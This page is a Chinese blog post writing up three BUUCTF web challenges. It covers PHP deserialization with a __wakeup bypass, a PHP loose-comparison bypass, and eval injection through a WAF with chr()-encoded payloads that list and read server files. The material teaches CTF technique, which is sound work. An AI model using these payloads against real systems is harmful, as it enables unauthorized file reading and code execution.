<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[BT]BUUCTF刷题第6天（3.24） - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/f38b9b18cc2d7b05ed2229fb442e1e79/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="[BT]BUUCTF刷题第6天（3.24）">
  <meta property="og:description" content="第6天 Web [极客大挑战 2019]PHP Payload：
O:4:&#34;Name&#34;:3:{s:14:&#34;%00Name%00username&#34;;s:5:&#34;admin&#34;;s:14:&#34;%00Name%00password&#34;;s:3:&#34;100&#34;;} 这道题考点是网站源码备份文件泄露和PHP反序列化，有篇介绍PHP反序列化考点的文章：PHP序列化反序列化漏洞总结（一篇懂）
打开网站是一个小游戏，根据题目提示得知需要找到网站的备份文件，这里使用dirsearch进行扫描（由于使用dirsearch自带的字典完整扫描一遍耗时过长，因此根据网上的题解我自己写了一个包含正确备份文件的字典，缩短扫描时间）
返回状态码200，说明确实存在该文件，访问下载
经过查看，flag.php中不包含正确flag，然后打开index.php进一步查看（发现关键内容：include &#39;class.php&#39;;和$res=unserialize(@$select);）
打开class.php文件
&amp;lt;?php include &#39;flag.php&#39;; error_reporting(0); class Name{ private $username = &#39;nonono&#39;; private $password = &#39;yesyes&#39;; public function __construct($username,$password){ /*__construct()当对象被创建即new之前， 会触发进行初始化，但在unserialize()时是不会自动调用的。*/ $this-&amp;gt;username = $username; $this-&amp;gt;password = $password; } function __wakeup(){ //__wakeup()将在反序列化之后立即调用 $this-&amp;gt;username = &#39;guest&#39;; } function __destruct(){ /* __destruct()在到某个对象的所有引用都被删除 或者当对象被显式销毁时执行*/ if ($this-&amp;gt;password != 100) { echo &#34;&amp;lt;/br&amp;gt;NO!!!hacker!!!&amp;lt;/br&amp;gt;&#34;; echo &#34;You name is: &#34;; echo $this-&amp;gt;username;echo &#34;&amp;lt;/br&amp;gt;&#34;; echo &#34;You password is: &#34;">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-24T23:47:54+08:00">
    <meta property="article:modified_time" content="2024-03-24T23:47:54+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[BT]BUUCTF刷题第6天（3.24）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="6_0"></a>第6天</h2> 
<h3><a id="Web_1"></a>Web</h3> 
<h4><a id="_2019PHP_2"></a>[极客大挑战 2019]PHP</h4> 
<p>Payload：</p> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>这道题考点是网站源码备份文件泄露和PHP反序列化，有篇介绍PHP反序列化考点的文章：<a href="https://marmalade.vip/phpserializezongjie.html" rel="nofollow">PHP序列化反序列化漏洞总结（一篇懂）</a></p> 
<p><img src="https://images2.imgbox.com/9b/96/XaWHz05a_o.png" alt="在这里插入图片描述"></p> 
<p>打开网站是一个小游戏，根据题目提示得知需要找到网站的备份文件，这里使用dirsearch进行扫描（由于使用dirsearch自带的字典完整扫描一遍耗时过长，因此根据网上的题解我自己写了一个包含正确备份文件的字典，缩短扫描时间）</p> 
<p><img src="https://images2.imgbox.com/01/9d/Mu9am3Mm_o.png" alt="在这里插入图片描述"></p> 
<p>返回状态码200，说明确实存在该文件，访问下载</p> 
<p><img src="https://images2.imgbox.com/48/6a/R1MAiCKy_o.png" alt="在这里插入图片描述"></p> 
<p>经过查看，flag.php中不包含正确flag，然后打开index.php进一步查看（发现关键内容：<code>include 'class.php';</code>和<code>$res=unserialize(@$select);</code>）</p> 
<p><img src="https://images2.imgbox.com/5d/15/fgcqiFQG_o.png" alt="在这里插入图片描述"></p> 
<p>打开class.php文件</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>    <span class="token comment">/*__construct()当对象被创建即new之前，
    会触发进行初始化，但在unserialize()时是不会自动调用的。*/</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>                                <span class="token comment">//__wakeup()将在反序列化之后立即调用</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>                             <span class="token comment">/* __destruct()在到某个对象的所有引用都被删除
    或者当对象被显式销毁时执行*/</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>需要反序列化后的对象满足username === 'admin’且password = 100</p> 
<p>初始Payload：</p> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nameusername"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Namepassword"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>生成代码：<br> user</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'100'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/77/2e/fuGnq1Wu_o.png" alt="在这里插入图片描述"></p> 
<p>因为<code>username</code>和<code>password</code>变量是private类型，变量中的类名前后会有空白符，而复制的时候会丢失，所以还需要加上%00（private类型序列化结果是%00类名%00属性值）</p> 
<p>修改后的Payload：</p> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>但是如果直接将这行字符串传进去反序列化的话网站会首先执行<code>__wakeup()</code>魔法方法修改username 为 ‘guest’，所以需要修改属性数量（当对象的属性数量和序列化后的属性数量值不等时会不执行<code>__wakeup()</code>魔法方法）</p> 
<p>最终Payload：</p> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p><em>注意“Name”后的<code>2</code>变成了<code>3</code>（只要不等于2就行）</em></p> 
<p>通过GET传参获取flag</p> 
<p><img src="https://images2.imgbox.com/5f/7f/Lg3riAGJ_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="ACTF2020_BackupFile_112"></a>[ACTF2020 新生赛]BackupFile</h4> 
<p>Payload：</p> 
<pre><code class="prism language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>a9e22c40<span class="token operator">-</span>e35e<span class="token operator">-</span>48a3<span class="token operator">-</span>81f3<span class="token operator">-</span>61db800e704d<span class="token punctuation">.</span>node5<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token punctuation">:</span><span class="token number">81</span>?key<span class="token operator">=</span><span class="token number">123</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/72/9a/GDEMTgF5_o.png" alt="在这里插入图片描述"><br> 提示我们需要找到源代码，所以这道题的解题思路也是备份文件，通过dirsearch扫描</p> 
<p><img src="https://images2.imgbox.com/ab/91/DeyFy4FQ_o.png" alt="在这里插入图片描述"></p> 
<p>发现了<code>index.php.bak文件</code>，访问这个文件自动下载</p> 
<p>直接打开后得到源码：</p> 
<pre><code class="prism language-python"><span class="token operator">&lt;</span>?php
include_once <span class="token string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    $key <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>!is_numeric<span class="token punctuation">(</span>$key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        exit<span class="token punctuation">(</span><span class="token string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    $key <span class="token operator">=</span> intval<span class="token punctuation">(</span>$key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>$key <span class="token operator">==</span> $<span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        echo $flag<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    echo <span class="token string">"Try to find out source file!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
?<span class="token operator">&gt;</span>
</code></pre> 
<p>考点是<code>==</code>的弱类型比较：</p> 
<ol><li>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较具体值</li><li>== 在进行比较的时候，会先将字符串类型转化成相同类型，再比较</li><li>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且按照数值来进行比较</li></ol> 
<p>这里$str = “123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”;被截取前三位，即<code>123</code>后与$key进行比较</p> 
<p>因此直接传<code>?key=123</code>即可拿到flag（注意只能是数字123，不能是字符串123，即<code>'123'</code>）</p> 
<h4><a id="RoarCTF_2019Easy_Calc_158"></a>[RoarCTF 2019]Easy Calc</h4> 
<p><img src="https://images2.imgbox.com/23/63/yTl8sqLu_o.png" alt="在这里插入图片描述"><br> 打开网站发现是一个类似计算器的内容，F12看到提示说网站使用了WAF防护并且还有一个calc.php文件</p> 
<p><img src="https://images2.imgbox.com/ef/f5/GtmHXa1M_o.png" alt="在这里插入图片描述"></p> 
<p>访问calc.php文件得到：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>可以看到假如我们传给num一个合适的值后（绕过黑名单）就能通过eval函数执行命令</p> 
<p>当num为数字时网页正常返回，但当num为非数字时，WAF会检测num并禁止访问</p> 
<p>这里的思路是，WAF检测的是"num"参数，若我们在num参数前添加空格，让<code>num</code>变成<code> num</code>，那么就可以绕过WAF，并且php在接受参数时会将空格删除，将 <code>num</code>转变成<code>num</code></p> 
<p>接下来是构造命令，因为php文件不允许空格和<code>\</code>,所以使用<code>chr(ASCII码)</code>进行绕过</p> 
<p>源Payload：</p> 
<pre><code class="prism language-python">? num<span class="token operator">=</span>scandir<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>      <span class="token operator">//</span>scandir可以扫描目录，这里是根目录
</code></pre> 
<p>绕过后的Payload：</p> 
<pre><code class="prism language-python">? num<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>scandir<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/61/2c/ikP1L6mZ_o.png" alt="在这里插入图片描述"></p> 
<p>发现<code>[5]=&gt; string(5) "f1agg"</code>，进行访问</p> 
<p>源Payload：</p> 
<pre><code class="prism language-python">? num<span class="token operator">=</span>file_get_contents<span class="token punctuation">(</span><span class="token string">"/f1agg"</span><span class="token punctuation">)</span>      <span class="token operator">//</span>
</code></pre> 
<p>绕过后的Payload：</p> 
<pre><code class="prism language-python">? num<span class="token operator">=</span>file_get_contents<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/3a8f94b822204b2493803a6cae8bfcfe/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Euler angles and Quaterean</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f6e42bd78ad795c451a2bf1ac1c6cfbf/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Web实现井字棋游戏：JavaScript DOM基础与实例教程</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>